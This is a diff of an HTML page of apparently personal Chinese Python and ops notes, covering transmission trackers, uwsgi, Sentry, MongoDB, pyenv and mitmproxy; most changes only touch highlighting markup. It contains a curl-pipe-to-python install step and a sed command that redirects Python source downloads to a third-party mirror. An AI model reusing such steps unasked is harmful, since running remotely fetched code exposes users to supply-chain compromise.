+<div class="codehilite"><pre><span></span><code>print(full_torrent.status, full_torrent.progress)
 </code></pre></div>
-
 
 <h3 id="tracker">给种子增加一个tracker<a class="headerlink" href="#tracker" title="Permanent link">&para;</a></h3>
 <p>这样可以把pt站点的种子转到OpenTracker，无需重新校验种子（但传到新的pt站点infohash会变，只能传新种子重新校验）</p>
 <p>transmissionrpc本身似乎没有暴露出trackerAdd的方法，这是结合浏览器和翻阅代码自己试出来的</p>
 <div class="codehilite"><pre><span></span><code><span class="n">torrent</span><span class="p">.</span><span class="n">_client</span><span class="p">.</span><span class="n">_request</span><span class="p">(</span><span class="s1">&#39;torrent-set&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">{</span><span class="ss">&quot;trackerAdd&quot;</span><span class="err">:</span><span class="w"> </span><span class="o">[</span><span class="n">new_tracker_url</span><span class="o">]</span><span class="err">}</span><span class="p">,</span><span class="w"> </span><span class="n">torrent</span><span class="p">.</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="k">True</span><span class="p">)</span><span class="w"></span>
 </code></pre></div>
-
 
 <h3 id="torrenttracker">修改一个.torrent文件的tracker<a class="headerlink" href="#torrenttracker" title="Permanent link">&para;</a></h3>
 <p>使用torf库，这个库使用了python3.6才支持的特性，依赖于格式化字符串、dict遍历的有序性</p>
@@ -3102,24 +3032,20 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
 <span class="n">t</span><span class="p">.</span><span class="k">write</span><span class="p">(</span><span class="ss">&quot;new.torrent&quot;</span><span class="p">)</span><span class="w"></span>
 </code></pre></div>
 
-
 <hr />
 <h2 id="uwsgi">uwsgi优雅重启<a class="headerlink" href="#uwsgi" title="Permanent link">&para;</a></h2>
 <p>参考：http://uwsgi-docs.readthedocs.io/en/latest/articles/TheArtOfGracefulReloading.html</p>
 <p>在uwsgi.ini中添加一行：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">master-fifo = /tmp/uwsgififo</span>
+<div class="codehilite"><pre><span></span><code>master-fifo = /tmp/uwsgififo
 </code></pre></div>
-
 
 <p>需要重启的时候就：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">echo r&gt;/tmp/uwsgififo</span>
+<div class="codehilite"><pre><span></span><code>echo r&gt;/tmp/uwsgififo
 </code></pre></div>
-
 
 <p>文件打开方式必须是&rdquo;w&rdquo;而不能是&rdquo;a&rdquo;：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">open(&quot;/tmp/uwsgififo&quot;, &quot;w&quot;).write(&quot;r&quot;)</span>
+<div class="codehilite"><pre><span></span><code>open(&quot;/tmp/uwsgififo&quot;, &quot;w&quot;).write(&quot;r&quot;)
 </code></pre></div>
-
 
 <h2 id="flask">flask设置一堆静态目录<a class="headerlink" href="#flask" title="Permanent link">&para;</a></h2>
 <div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">Blueprint</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">Markup</span>
@@ -3128,7 +3054,6 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
     <span class="n">blueprint</span> <span class="o">=</span> <span class="n">Blueprint</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="vm">__name__</span><span class="p">,</span> <span class="n">static_url_path</span><span class="o">=</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="n">path</span><span class="p">,</span> <span class="n">static_folder</span><span class="o">=</span><span class="n">path</span><span class="p">)</span>
     <span class="n">app</span><span class="o">.</span><span class="n">register_blueprint</span><span class="p">(</span><span class="n">blueprint</span><span class="p">)</span>
 </code></pre></div>
-
 
 <hr />
 <h2 id="python35-openutf-8">Python3.5 open打开文件默认使用utf-8<a class="headerlink" href="#python35-openutf-8" title="Permanent link">&para;</a></h2>
@@ -3142,27 +3067,23 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
     <span class="n">_locale</span><span class="o">.</span><span class="n">_getdefaultlocale</span> <span class="o">=</span> <span class="p">(</span><span class="k">lambda</span> <span class="o">*</span><span class="n">args</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;en_US&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">])</span>
 </code></pre></div>
 
-
 <hr />
 <h2 id="pythonurl">Python提取url 正则匹配的回溯爆炸问题<a class="headerlink" href="#pythonurl" title="Permanent link">&para;</a></h2>
 <p>提取url想遇到中文字符就不算入url中，写出了这样的正则(Python)，把中文加入到最后的排除字符：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">_url_re = re.compile(r&#39;(?im)((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()&lt;&gt;，。（）]+|\([^\s()&lt;&gt;，。（）]+\))+(?:\([^\s()&lt;&gt;，。（）]+\)|[^\u4e00-\u9fa5，。（）\s`!()\[\]{};:\&#39;&quot;.,&lt;&gt;?]))&#39;)</span>
+<div class="codehilite"><pre><span></span><code>_url_re = re.compile(r&#39;(?im)((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()&lt;&gt;，。（）]+|\([^\s()&lt;&gt;，。（）]+\))+(?:\([^\s()&lt;&gt;，。（）]+\)|[^\u4e00-\u9fa5，。（）\s`!()\[\]{};:\&#39;&quot;.,&lt;&gt;?]))&#39;)
 </code></pre></div>
-
 
 <p>然后实际运行的时候发现网站特定页面访问特别缓慢，CPU占用高，排除许久死循环后发现是这个正则花了太长的时间</p>
 <p>解决方案就是放弃使用正则来剔除中文，提取出含有中文字符的url后再做处理去掉中文字符（字节数&gt;1的）</p>
 <p>现在使用的正则是：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">_url_re = re.compile(r&#39;(?im)((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()&lt;&gt;]+|\([^\s()&lt;&gt;]+\))+(?:\([^\s()&lt;&gt;]+\)|[^\s`!()\[\]{};:\&#39;&quot;.,&lt;&gt;?]))&#39;)</span>
+<div class="codehilite"><pre><span></span><code>_url_re = re.compile(r&#39;(?im)((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()&lt;&gt;]+|\([^\s()&lt;&gt;]+\))+(?:\([^\s()&lt;&gt;]+\)|[^\s`!()\[\]{};:\&#39;&quot;.,&lt;&gt;?]))&#39;)
 </code></pre></div>
-
 
 <p>提取后的处理代码：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">start, end = match.span()</span>
-<span class="err">while len(data[end-1].encode(&quot;utf-8&quot;))&gt;1:</span>
-<span class="err">    end -= 1</span>
+<div class="codehilite"><pre><span></span><code><span class="nv">start</span>, <span class="k">end</span> <span class="o">=</span> <span class="nv">match</span>.<span class="nv">span</span><span class="ss">()</span>
+<span class="k">while</span> <span class="nv">len</span><span class="ss">(</span><span class="nv">data</span>[<span class="k">end</span><span class="o">-</span><span class="mi">1</span>].<span class="nv">encode</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">utf-8</span><span class="s2">&quot;</span><span class="ss">))</span><span class="o">&gt;</span><span class="mi">1</span>:
+    <span class="k">end</span> <span class="o">-=</span> <span class="mi">1</span>
 </code></pre></div>
-
 
 <p>现在改为更加保守的 从左往右遍历，遇到字节数&gt;1的就终止url：</p>
 <div class="codehilite"><pre><span></span><code><span class="k">start</span><span class="p">,</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">match</span><span class="p">.</span><span class="n">span</span><span class="p">()</span><span class="w"></span>
@@ -3172,13 +3093,11 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
 <span class="k">end</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">newend</span><span class="w"></span>
 </code></pre></div>
 
-
 <hr />
 <h2 id="ubuntugmpy2">ubuntu安装gmpy2<a class="headerlink" href="#ubuntugmpy2" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span><code><span class="err">apt install libmpc-dev libmpfr-dev</span>
-<span class="err">pip install gmpy2</span>
+<div class="codehilite"><pre><span></span><code>apt install libmpc-dev libmpfr-dev
+pip install gmpy2
 </code></pre></div>
-
 
 <p>辣鸡的官方文档都不提一下apt安装依赖库的事情，apt能搞定的为啥还要自己编译hhh</p>
 <p>支持python3 也可以-t .安装到当前目录，就是编译生成了一个so文件</p>
@@ -3191,7 +3110,6 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
 <span class="cp">{%</span>- <span class="k">endfor</span> -<span class="cp">%}</span><span class="x"></span>
 </code></pre></div>
 
-
 <hr />
 <h2 id="sentry">使用sentry<a class="headerlink" href="#sentry" title="Permanent link">&para;</a></h2>
 <p>在py文件一开始进行加载，会自动处理没有被handle的异常</p>
@@ -3200,7 +3118,6 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
 <span class="kn">from</span> <span class="nn">sentry_sdk</span> <span class="kn">import</span> <span class="n">capture_message</span><span class="p">,</span> <span class="n">capture_exception</span>
 <span class="n">sentry_sdk</span><span class="o">.</span><span class="n">init</span><span class="p">(</span><span class="s2">&quot;....&quot;</span><span class="p">)</span>
 </code></pre></div>
-
 
 <p>在出现了意外但是不严重可以pass的时候 代替<code>traceback.print_exc()</code>：</p>
 <div class="codehilite"><pre><span></span><code><span class="k">try</span><span class="o">:</span>
@@ -3211,16 +3128,14 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
     <span class="n">pass</span>
 </code></pre></div>
 
-
 <p>如果是flask的应用 比如用户登录了，希望报错的时候顺带给出用户名：</p>
 <div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">sentry_sdk</span> <span class="kn">import</span> <span class="n">configure_scope</span>
-<span class="nd">@app.before_request</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">before_request</span>
 <span class="k">def</span> <span class="nf">before_request_session</span><span class="p">():</span>
     <span class="k">if</span> <span class="s2">&quot;username&quot;</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
         <span class="k">with</span> <span class="n">configure_scope</span><span class="p">()</span> <span class="k">as</span> <span class="n">scope</span><span class="p">:</span>
             <span class="n">scope</span><span class="o">.</span><span class="n">user</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">session</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]}</span>
 </code></pre></div>
-
 
 <h3 id="sentry_1">不要过于依赖Sentry<a class="headerlink" href="#sentry_1" title="Permanent link">&para;</a></h3>
 <p><code>capture_exception</code>和<code>capture_message</code> 都是同步调用 本质上是一个耗时的网络请求</p>
@@ -3228,14 +3143,12 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
 <p>对于已经知道会有异常产生也不关心的，就不要抓住这种异常来损害性能了 pass就好了</p>
 <h2 id="pysysargv">解决命令行执行py文件没有sys.argv的问题<a class="headerlink" href="#pysysargv" title="Permanent link">&para;</a></h2>
 <p>这是由于打开方式没有把%*加上的原因，修改注册表 regedit</p>
-<div class="codehilite"><pre><span></span><code><span class="err">HKEY_CLASSES_ROOT\Python.File\Shell\open\command</span>
+<div class="codehilite"><pre><span></span><code>HKEY_CLASSES_ROOT\Python.File\Shell\open\command
 </code></pre></div>
-
 
 <p>末尾加上<code>%*</code>即可，例如改为</p>
-<div class="codehilite"><pre><span></span><code><span class="err">&quot;C:\Python37\python.exe&quot; &quot;%1&quot; %*</span>
+<div class="codehilite"><pre><span></span><code>&quot;C:\Python37\python.exe&quot; &quot;%1&quot; %*
 </code></pre></div>
-
 
 <p>你也可以用管理员权限的cmd来做修改：</p>
 <p>先查询.py的文件类型：<code>assoc .py</code>查到<code>.py=Python.File</code></p>
@@ -3260,7 +3173,6 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
     <span class="k">return</span> <span class="n">result</span>
 </code></pre></div>
 
-
 <p>调用如<code>getcookie(".zhihu.com")</code></p>
 <hr />
 <h2 id="winencodingutf-8">Win开发摆脱每次都要写的encoding=utf-8<a class="headerlink" href="#winencodingutf-8" title="Permanent link">&para;</a></h2>
@@ -3269,7 +3181,6 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
 <div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">_locale</span>
 <span class="n">_locale</span><span class="o">.</span><span class="n">_getdefaultlocale</span> <span class="o">=</span> <span class="p">(</span><span class="k">lambda</span> <span class="o">*</span><span class="n">args</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;en_US&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">])</span>
 </code></pre></div>
-
 
 <p>验证可以用：<code>python -c "print(open('x','w').encoding)"</code> 输出<code>utf8</code>而不是<code>cp936</code>即可</p>
 <p>参考： https://juejin.im/post/5bd2b6d5e51d45735c3c0453</p>
@@ -3283,7 +3194,6 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
     <span class="n">curl</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">pypa</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">get</span><span class="o">-</span><span class="n">pip</span><span class="o">.</span><span class="n">py</span> <span class="o">|</span> <span class="n">python</span> <span class="o">&amp;&amp;</span>\
     <span class="n">pip</span> <span class="n">install</span> <span class="o">-</span><span class="n">U</span> <span class="n">setuptools</span>
 </code></pre></div>
-
 
 <p>但是在ubuntu 14.04上从这个ppa源安装的python没有_ssl的库，无法使用pip很迷（解决方案就是开了一个docker ubuntu16.04的容器继续）</p>
 <hr />
@@ -3303,13 +3213,11 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
 <span class="k">done</span>
 </code></pre></div>
 
-
 <p>用法：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">python -u run.py &gt;&amp; log.txt &amp;</span>
-<span class="err">ps #查看python进程的id, 假设为12345</span>
-<span class="err">./watch.sh log.txt &quot;kill -SIGINT 12345&quot;</span>
+<div class="codehilite"><pre><span></span><code>python -u run.py &gt;&amp; log.txt &amp;
+ps #查看python进程的id, 假设为12345
+./watch.sh log.txt &quot;kill -SIGINT 12345&quot;
 </code></pre></div>
-
 
 <p>解释：python指定输出流不缓存，保证最新的print也能实时写入文件中</p>
 <p>然后使用inotifywait这个工具观察文件<code>$1</code>在100秒内有没有发生修改</p>
@@ -3332,13 +3240,11 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
 <div class="codehilite"><pre><span></span><code><span class="n">setx</span> <span class="n">PYTHONSTARTUP</span> <span class="n">d</span><span class="p">:</span>\<span class="n">myshell</span>\<span class="n">pyload</span><span class="o">.</span><span class="n">py</span>
 </code></pre></div>
 
-
 <p>这个脚本需要快速加载，避免启动Python太慢，所以使用lazyload来把真正的import留到使用时：</p>
 <p>依赖： PYTHONUTF8=1使得windows的python读写文件默认也使用UTF8</p>
-<div class="codehilite"><pre><span></span><code><span class="err">set PYTHONUTF8=1</span>
-<span class="err">pip install lazy_import</span>
+<div class="codehilite"><pre><span></span><code>set PYTHONUTF8=1
+pip install lazy_import
 </code></pre></div>
-
 
 <p>先简要概括一下这个脚本提供了些啥：</p>
 <div class="codehilite"><pre><span></span><code><span class="err">标准库：</span><span class="n">time</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">json</span><span class="p">,</span> <span class="n">pickle</span><span class="p">,</span> <span class="n">csv</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">np</span><span class="p">(</span><span class="n">numpy</span><span class="p">),</span> <span class="n">plt</span><span class="p">(</span><span class="n">matplotlib</span><span class="o">.</span><span class="n">pyplot</span><span class="p">)</span>
@@ -3360,7 +3266,6 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
     <span class="n">sleep</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">sleep</span>
     <span class="n">leval</span> <span class="o">=</span> <span class="n">ast</span><span class="o">.</span><span class="n">literal_eval</span>
 </code></pre></div>
-
 
 <div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">_locale</span>
 <span class="n">_locale</span><span class="o">.</span><span class="n">_getdefaultlocale</span> <span class="o">=</span> <span class="p">(</span><span class="k">lambda</span> <span class="o">*</span><span class="n">args</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;en_US&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">])</span>
@@ -3452,15 +3357,13 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
     <span class="k">return</span> <span class="n">datetime</span><span class="o">.</span><span class="n">fromtimestamp</span><span class="p">(</span><span class="n">ts</span><span class="p">)</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&quot;%Y-%m-</span><span class="si">%d</span><span class="s2"> %H:%M:%S&quot;</span><span class="p">)</span>
 </code></pre></div>
 
-
 <hr />
 <h2 id="pythonmongodb">Python使用MongoDB<a class="headerlink" href="#pythonmongodb" title="Permanent link">&para;</a></h2>
 <p>爬取数据ajax接口返回的是json数据，懒得转换成mysql的表示，直接丢给mongo呗</p>
 <p>可视化客户端使用官方的<a href="https://www.mongodb.com/try/download/compass">Compass</a></p>
 <h3 id="server">安装server<a class="headerlink" href="#server" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span><code><span class="err">docker run -d --name mongo -e MONGO_INITDB_ROOT_USERNAME=adminusername -e MONGO_INITDB_ROOT_PASSWORD=password -v /srv/mongo:/data/db -p 27017:27017 mongo</span>
+<div class="codehilite"><pre><span></span><code>docker run -d --name mongo -e MONGO_INITDB_ROOT_USERNAME=adminusername -e MONGO_INITDB_ROOT_PASSWORD=password -v /srv/mongo:/data/db -p 27017:27017 mongo
 </code></pre></div>
-
 
 <p>安装后的连接字符串是：<code>mongodb://adminusername:password@ip:27017</code></p>
 <h3 id="_15">增删查改<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
@@ -3470,10 +3373,9 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
 <div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pymongo</span>
 <span class="n">client</span> <span class="o">=</span> <span class="n">pymongo</span><span class="o">.</span><span class="n">MongoClient</span><span class="p">(</span><span class="s2">&quot;mongodb://adminusername:password@127.0.0.1:27017&quot;</span><span class="p">)</span>
 <span class="n">table</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">database_name</span><span class="o">.</span><span class="n">table_name</span>
-<span class="k">print</span><span class="p">(</span><span class="n">table</span><span class="o">.</span><span class="n">find_one</span><span class="p">({</span><span class="s2">&quot;_id&quot;</span><span class="p">:</span> <span class="nb">id</span><span class="p">}))</span>
-<span class="k">print</span><span class="p">(</span><span class="n">table</span><span class="o">.</span><span class="n">count_documents</span><span class="p">({}))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">table</span><span class="o">.</span><span class="n">find_one</span><span class="p">({</span><span class="s2">&quot;_id&quot;</span><span class="p">:</span> <span class="nb">id</span><span class="p">}))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">table</span><span class="o">.</span><span class="n">count_documents</span><span class="p">({}))</span>
 </code></pre></div>
-
 
 <h4 id="_17">批量增加<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h4>
 <p>insert ignore into 忽略已经存在的：</p>
@@ -3483,40 +3385,36 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
     <span class="n">pass</span>
 </code></pre></div>
 
-
 <p>replace into 覆盖已经存在的：使用upcert不存在时插入</p>
-<div class="codehilite"><pre><span></span><code><span class="err">for item in data:</span>
-<span class="err">    # 你很可能需要自己定义_id</span>
-<span class="err">    # item[&quot;_id&quot;] = &quot;_&quot;.join([...])</span>
-<span class="err">    # pprint(item)</span>
-<span class="err">    table.update({&#39;_id&#39;:item[&quot;_id&quot;]}, item, True)</span>
+<div class="codehilite"><pre><span></span><code><span class="k">for</span> <span class="nv">item</span> <span class="nv">in</span> <span class="nv">data</span>:
+    # 你很可能需要自己定义<span class="nv">_id</span>
+    # <span class="nv">item</span>[<span class="s2">&quot;</span><span class="s">_id</span><span class="s2">&quot;</span>] <span class="o">=</span> <span class="s2">&quot;</span><span class="s">_</span><span class="s2">&quot;</span>.<span class="nv">join</span><span class="ss">(</span>[...]<span class="ss">)</span>
+    # <span class="nv">pprint</span><span class="ss">(</span><span class="nv">item</span><span class="ss">)</span>
+    <span class="nv">table</span>.<span class="nv">update</span><span class="ss">(</span>{<span class="s1">&#39;</span><span class="s">_id</span><span class="s1">&#39;</span>:<span class="nv">item</span>[<span class="s2">&quot;</span><span class="s">_id</span><span class="s2">&quot;</span>]}, <span class="nv">item</span>, <span class="nv">True</span><span class="ss">)</span>
 </code></pre></div>
-
 
 <h4 id="_18">删除<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h4>
 <p>类似的有函数：delete_one, delete_many</p>
 <h3 id="join">多表join查询<a class="headerlink" href="#join" title="Permanent link">&para;</a></h3>
 <p>table中文档里有一个属性idB，对应tableB的_id，使用<code>$lookup</code>做join操作，无论有没有查到都会返回新的文档，没查到时dst属性为空数组</p>
 <p>所以可以用<code>$match</code>继续筛选查到的内容；然后统计数量，注意到$count在没有结果的时候不返回内容，需要单独处理</p>
-<div class="codehilite"><pre><span></span><code><span class="err">def howmany():</span>
-<span class="err">    pipeline = [</span>
-<span class="err">        {&quot;$match&quot;: {&quot;idB&quot;: {&quot;$exists&quot;: True}}}, </span>
-<span class="err">        {&quot;$lookup&quot;: {&quot;from&quot;: &#39;tableB&#39;, &quot;localField&quot;: &#39;idB&#39;, &quot;foreignField&quot;: &#39;_id&#39;, &quot;as&quot;: &#39;dst&#39;}},</span>
-<span class="err">        {&quot;$match&quot;: {&quot;dst&quot;: {&quot;$size&quot;: 1}}},</span>
-<span class="err">        {&quot;$count&quot;: &quot;cnt&quot;}</span>
-<span class="err">    ]</span>
-<span class="err">    data = list(table.aggregate(pipeline))</span>
-<span class="err">    if not data:</span>
-<span class="err">        return 0</span>
-<span class="err">    return data[0][&quot;cnt&quot;]</span>
+<div class="codehilite"><pre><span></span><code><span class="n">def</span> <span class="n">howmany</span><span class="p">()</span><span class="o">:</span>
+    <span class="n">pipeline</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="p">{</span><span class="s">&quot;$match&quot;</span><span class="o">:</span> <span class="p">{</span><span class="s">&quot;idB&quot;</span><span class="o">:</span> <span class="p">{</span><span class="s">&quot;$exists&quot;</span><span class="o">:</span> <span class="n">True</span><span class="p">}}},</span> 
+        <span class="p">{</span><span class="s">&quot;$lookup&quot;</span><span class="o">:</span> <span class="p">{</span><span class="s">&quot;from&quot;</span><span class="o">:</span> <span class="p">&#39;</span><span class="n">tableB</span><span class="p">&#39;,</span> <span class="s">&quot;localField&quot;</span><span class="o">:</span> <span class="p">&#39;</span><span class="n">idB</span><span class="p">&#39;,</span> <span class="s">&quot;foreignField&quot;</span><span class="o">:</span> <span class="p">&#39;</span><span class="n">_id</span><span class="p">&#39;,</span> <span class="s">&quot;as&quot;</span><span class="o">:</span> <span class="p">&#39;</span><span class="n">dst</span><span class="p">&#39;}},</span>
+        <span class="p">{</span><span class="s">&quot;$match&quot;</span><span class="o">:</span> <span class="p">{</span><span class="s">&quot;dst&quot;</span><span class="o">:</span> <span class="p">{</span><span class="s">&quot;$size&quot;</span><span class="o">:</span> <span class="mh">1</span><span class="p">}}},</span>
+        <span class="p">{</span><span class="s">&quot;$count&quot;</span><span class="o">:</span> <span class="s">&quot;cnt&quot;</span><span class="p">}</span>
+    <span class="p">]</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">list</span><span class="p">(</span><span class="k">table</span><span class="p">.</span><span class="n">aggregate</span><span class="p">(</span><span class="n">pipeline</span><span class="p">))</span>
+    <span class="k">if</span> <span class="k">not</span> <span class="nl">data:</span>
+        <span class="k">return</span> <span class="mh">0</span>
+    <span class="k">return</span> <span class="n">data</span><span class="p">[</span><span class="mh">0</span><span class="p">][</span><span class="s">&quot;cnt&quot;</span><span class="p">]</span>
 </code></pre></div>
-
 
 <h3 id="_19">随机采样<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h3>
 <p>pipeline中使用：但是注意可能会有重复的元素 需要自己去重</p>
-<div class="codehilite"><pre><span></span><code><span class="err">{&quot;$sample&quot;: {&quot;size&quot;:10}}</span>
+<div class="codehilite"><pre><span></span><code>{&quot;$sample&quot;: {&quot;size&quot;:10}}
 </code></pre></div>
-
 
 <hr />
 <h2 id="pyenvpython">使用pyenv编译安装不同版本的Python<a class="headerlink" href="#pyenvpython" title="Permanent link">&para;</a></h2>
@@ -3528,21 +3426,18 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
 <span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;if command -v pyenv 1&gt;/dev/null 2&gt;&amp;1; then</span><span class="se">\n</span><span class="s1">  eval &quot;$(pyenv init -)&quot;</span><span class="se">\n</span><span class="s1">fi&#39;</span> <span class="o">&gt;&gt;</span> <span class="o">~/.</span><span class="n">bash_profile</span>
 </code></pre></div>
 
-
 <p>然后就能编译安装特定版本的Python了，以3.7.0为例：使用我提供的www.python.org的镜像</p>
-<div class="codehilite"><pre><span></span><code><span class="err">apt install -y libffi-dev libgnutls28-dev</span>
-<span class="err">cd ~/.pyenv/plugins</span>
-<span class="err">sed -i &#39;s#www.python.org#py.py3.io#g&#39; $(grep www.python.org -r . -l)</span>
-<span class="err">pyenv install -v 3.7.0</span>
-<span class="err">pyenv global 3.7.0</span>
+<div class="codehilite"><pre><span></span><code>apt install -y libffi-dev libgnutls28-dev
+cd ~/.pyenv/plugins
+sed -i &#39;s#www.python.org#py.py3.io#g&#39; $(grep www.python.org -r . -l)
+pyenv install -v 3.7.0
+pyenv global 3.7.0
 </code></pre></div>
-
 
 <p>之后使用如果遇到密码学库的问题：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">pip uninstall pycrypto pycryptodome</span>
-<span class="err">pip install pycryptodome</span>
+<div class="codehilite"><pre><span></span><code>pip uninstall pycrypto pycryptodome
+pip install pycryptodome
 </code></pre></div>
-
 
 <hr />
 <h2 id="_20">发送钉钉消息<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h2>
@@ -3552,11 +3447,10 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
     <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
         <span class="s2">&quot;msgtype&quot;</span> <span class="p">:</span> <span class="s2">&quot;text&quot;</span> <span class="p">,</span>
         <span class="s2">&quot;text&quot;</span> <span class="p">:</span> <span class="p">{</span> <span class="s2">&quot;content&quot;</span> <span class="p">:</span> <span class="n">text</span> <span class="p">},</span>
-        <span class="s2">&quot;isAtAll&quot;</span> <span class="p">:</span> <span class="bp">False</span> 
+        <span class="s2">&quot;isAtAll&quot;</span> <span class="p">:</span> <span class="kc">False</span> 
     <span class="p">}</span>
     <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;https://oapi.dingtalk.com/robot/send?access_token=&quot;</span><span class="o">+</span><span class="n">token</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
 </code></pre></div>
-
 
 <hr />
 <h2 id="mitmproxy">使用mitmproxy<a class="headerlink" href="#mitmproxy" title="Permanent link">&para;</a></h2>
@@ -3581,7 +3475,7 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
     <span class="k">def</span> <span class="nf">response</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">flow</span><span class="p">):</span>
         <span class="bp">self</span><span class="o">.</span><span class="n">num</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">num</span> <span class="o">+</span> <span class="mi">1</span>
         <span class="n">flow</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&quot;count&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">num</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">num</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">num</span><span class="p">)</span>
 
 
 <span class="c1"># see source mitmproxy/master.py for details</span>
@@ -3591,8 +3485,8 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
 
 
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
-    <span class="n">options</span> <span class="o">=</span> <span class="n">Options</span><span class="p">(</span><span class="n">listen_host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">listen_port</span><span class="o">=</span><span class="mi">8080</span><span class="p">,</span> <span class="n">http2</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-    <span class="n">m</span> <span class="o">=</span> <span class="n">DumpMaster</span><span class="p">(</span><span class="n">options</span><span class="p">,</span> <span class="n">with_termlog</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">with_dumper</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
